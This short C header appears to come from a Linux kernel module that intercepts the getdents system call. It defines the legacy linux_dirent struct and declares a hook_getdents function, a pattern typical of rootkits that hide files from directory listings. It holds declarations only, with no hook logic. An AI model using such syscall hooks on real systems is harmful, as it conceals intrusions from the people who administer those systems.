#pragma once

#include "../syscalls.h"

// linux_dirent removed from kernel
struct linux_dirent {
  unsigned long d_ino;
  unsigned long d_off;
  unsigned short d_reclen;
  char d_name[];
};

#ifdef PTREGS_SYSCALL_STUBS
asmlinkage int hook_getdents(const struct pt_regs* regs);
#else
asmlinkage int hook_getdents(unsigned int fd, struct linux_dirent* dirent, unsigned int count);
#endif
